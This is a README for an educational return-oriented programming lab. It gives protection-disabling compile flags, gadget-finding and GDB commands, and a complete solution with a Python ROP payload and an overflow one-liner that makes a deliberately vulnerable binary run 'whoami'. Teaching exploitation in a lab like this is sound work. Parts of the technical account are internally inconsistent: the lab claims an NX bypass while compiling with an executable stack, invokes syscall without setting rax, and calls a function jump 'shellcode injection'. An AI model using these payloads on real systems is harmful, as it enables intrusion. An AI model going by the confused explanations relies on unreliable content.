# CyberLabs: ROP (Return-Oriented Programming) Vulnerability Laboratory

**Module Code:** CL-MEM-005

**Level:** Advanced

**Topic:** Modern Exploit Techniques and Protection Bypass

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses one of the modern exploit techniques: **Return-Oriented Programming (ROP)**. Participants are expected to gain the following competencies by the end of this laboratory:

- Understanding the basic principles of ROP technique and how it bypasses NX bit protection.
- Learning to control program flow using existing code pieces (gadgets).
- Performing gadget analysis using tools like `objdump`, `gdb`, and `ROPgadget`.
- Practically seeing how to take control of program flow by creating a real ROP chain.
- Learning techniques to bypass modern protection mechanisms (NX, ASLR, Stack Canary).

## Difficulty Levels

## üü¢ **EASY WAY: With Debug Symbols**
```bash
# Add -g flag in test_lab.sh file
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Easier analysis with debug symbols
- `p &variable` commands work in GDB
- Ideal for educational purposes

## üî¥ **HARD WAY: Without Debug Symbols (Default)**
```bash
# Current compilation (no debug symbols)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Closer to real world
- Requires `info functions`, `disassemble` commands
- Production binaries don't have debug symbols

## What is ROP (Return-Oriented Programming)?

**Return-Oriented Programming (ROP)** is an exploit technique developed to bypass **NX bit** (No-Execute) protection in modern operating systems. This technique allows attackers to control program flow by using existing code pieces (gadgets) in the program instead of executing their own shellcode.

### Basic Principles of ROP:

1. **Gadget Finding:** Finding small code pieces ending with `ret` instruction in the program
2. **Chain Creation:** Combining these gadgets sequentially to achieve desired functionality
3. **Stack Manipulation:** Using the stack to transfer data between gadgets
4. **Return Address Overwrite:** Replacing return address with first gadget's address using buffer overflow

### ROP Advantages:
- Bypasses NX bit protection
- Can bypass ASLR (with information leak)
- Can bypass Stack Canary
- Uses real code, harder to detect by antivirus

## Disclaimer / Legal Warning

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities.

### Prohibited Uses
- Use outside CyberLabs educational environment
- Illegal activities or unauthorized system access
- Malicious exploitation of real systems
- Distribution for non-educational purposes

### Responsibility
The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user. Authors and CyberLabs are not responsible for misuse of these educational materials.

## Scenario

The laboratory scenario consists of two main components:

1. **`vulnerable_code.cpp`:** Target application written in C++ that intentionally contains a buffer overflow vulnerability. Exploitable with ROP despite NX bit protection being active.

2. **`exploit.py`:** Python exploit script that creates ROP chain using the vulnerability in the vulnerable application and takes control of program flow.

## Platform Compatibility

This lab works on both **Linux (x86_64)** and **macOS (ARM64)** platforms:

### üêß **Linux x86_64**
- Uses real ROP chain
- x86_64 assembly gadgets
- NX bit bypass techniques
- Production-like environment

### üçé **macOS ARM64**
- Educational simple ROP chain
- ARM64 architecture differences
- Platform-specific optimizations
- Development environment

## Installation and Execution Steps

### 1. Compiling the Vulnerable Code

```bash
# Automatic compilation (with platform detection)
./compile_linux.sh

# Manual compilation for Linux
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# Manual compilation for macOS
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Compilation Flags Explanation:**
- `-m64`: 64-bit compilation
- `-fno-stack-protector`: Disable stack canary protection
- `-z execstack`: Make stack executable (for some ROP techniques)
- `-no-pie`: Disable Position Independent Executable
- `-Wno-unused-result`: Suppress unused result warnings
- `-Wno-stringop-overflow`: Suppress string overflow warnings

### 2. Analyzing ROP Gadgets

```bash
# Finding gadgets with objdump
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# With ROPgadget tool (if installed)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. Dynamic Analysis with GDB

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Running the Exploit

```bash
# Automatic test
./test_lab.sh

# Manual exploit
python3 source_code/exploit.py
```

## ROP Chain Structure

The ROP chain structure used in this laboratory:

### üêß **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
‚îú‚îÄ‚îÄ pop rdi; ret (gadget)
‚îú‚îÄ‚îÄ 0x0 (rdi value)
‚îú‚îÄ‚îÄ pop rsi; ret (gadget)  
‚îú‚îÄ‚îÄ 0x0 (rsi value)
‚îú‚îÄ‚îÄ pop rdx; ret (gadget)
‚îú‚îÄ‚îÄ 0x0 (rdx value)
‚îú‚îÄ‚îÄ syscall; ret (gadget)
‚îî‚îÄ‚îÄ execute_whoami (shellcode injection)
```

### üçé **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
‚îî‚îÄ‚îÄ execute_whoami (simple command injection)
```

### üíª **Shellcode Injection:**
- **Linux:** Real ROP chain with `system("whoami")` call
- **macOS:** Simple function call to execute `system("whoami")`
- **Target:** Execute system commands via ROP

## Learning Objectives

### Basic Level:
- Understanding what ROP technique is
- Learning gadget concept
- Creating simple ROP chains

### Intermediate Level:
- Bypassing NX bit protection
- Stack manipulation techniques
- Controlling register values

### Advanced Level:
- Complex ROP chains
- ASLR bypass techniques
- Real-world ROP exploits

## Required Tools

- **GDB:** Dynamic analysis and debugging
- **objdump:** Static analysis and gadget finding
- **ROPgadget:** Automatic gadget analysis (optional)
- **pwntools:** Python exploit development
- **hexdump:** Binary data analysis

## Troubleshooting

### Common Issues:

1. **"Permission denied" error:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" error:**
   - Find addresses manually with GDB
   - Use `info functions` command

3. **"ROP chain failed" error:**
   - Check gadget addresses
   - Check stack alignment

## Complete Solution (Finding Addresses with GDB)

### 1. Finding Addresses with GDB

```bash
# Open binary with GDB
gdb ./compiled/vulnerable_code

# Find function addresses
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# Show function addresses
(gdb) x/gx win_function
(gdb) x/gx execute_whoami
(gdb) x/gx gadget_pop_rdi
(gdb) x/gx gadget_pop_rsi
(gdb) x/gx gadget_pop_rdx
(gdb) x/gx gadget_syscall

# Examine gadgets with disassembly
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# Test buffer overflow
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. Creating ROP Chain

#### For Linux x86_64:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# ROP chain
payload += p64(pop_rdi_addr)    # pop rdi; ret
payload += p64(0x0)             # rdi value
payload += p64(pop_rsi_addr)    # pop rsi; ret
payload += p64(0x0)             # rsi value
payload += p64(pop_rdx_addr)    # pop rdx; ret
payload += p64(0x0)             # rdx value
payload += p64(syscall_addr)    # syscall; ret
payload += p64(whoami_addr)     # execute_whoami function
```

#### For macOS ARM64:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Simple ROP chain (ARM64 different)
payload += p64(whoami_addr)     # execute_whoami function
```

### 3. Running Exploit

```bash
# Run exploit
python3 source_code/exploit.py

# Manual test
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x06\x00\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code
```

### 4. Expected Result

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[username]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## Advanced Topics

- **ASLR Bypass:** Bypassing ASLR with information leak
- **Stack Pivot:** Manipulating stack pointer
- **JOP (Jump-Oriented Programming):** Alternative to ROP
- **COP (Call-Oriented Programming):** Using call instructions
- **ROP Chain Optimization:** Creating more efficient chains

## Resources

- [ROP Emporium](https://ropemporium.com/) - ROP learning platform
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - Basic ROP article
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analysis tool
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit development library

## Contributing

To improve this laboratory:
1. Fork the project
2. Add new features
3. Submit pull request

## License

This project is licensed under the MIT License.

## Contact

- **CyberLabs:** [GitHub](https://github.com/CyberLabs)
- **Email:** info@cyberlabs.com
- **Web:** https://cyberlabs.com
